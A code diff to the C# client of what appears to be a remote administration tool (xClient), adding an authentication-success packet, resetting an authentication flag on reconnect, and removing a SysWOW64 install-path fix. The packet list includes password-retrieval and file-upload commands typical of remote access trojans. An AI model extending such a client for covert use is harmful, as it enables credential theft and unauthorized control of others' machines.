@@ -87,6 +87,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.DoUploadFile),
                 typeof (Core.Packets.ServerPackets.GetPasswords),
                 typeof (Core.Packets.ServerPackets.DoLoadRegistryKey),
+                typeof (Core.Packets.ServerPackets.SetAuthenticationSuccess),
                 typeof (Core.Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Core.Packets.ClientPackets.SetStatus),
                 typeof (Core.Packets.ClientPackets.SetStatusFileManager),
@@ -120,13 +121,7 @@ namespace xClient
 
             AES.PreHashKey(Settings.PASSWORD);
             _hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
-
-            // https://stackoverflow.com/questions/3540930/getting-syswow64-directory-using-32-bit-application
-            if (PlatformHelper.Architecture == 64 && Settings.DIR == Environment.GetFolderPath(Environment.SpecialFolder.System))
-                Settings.DIR = NativeMethodsHelper.GetSystemWow64Directory();
-
             ClientData.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
-
             GeoLocationHelper.Initialize();
 
             if (!MutexHelper.CreateMutex(Settings.MUTEX))
@@ -215,6 +210,8 @@ namespace xClient
 
         private static void ClientState(Client client, bool connected)
         {
+            ClientData.IsAuthenticated = false;
+
             if (connected && !ClientData.Disconnect)
                 _reconnect = true;
             else if (!connected && ClientData.Disconnect)
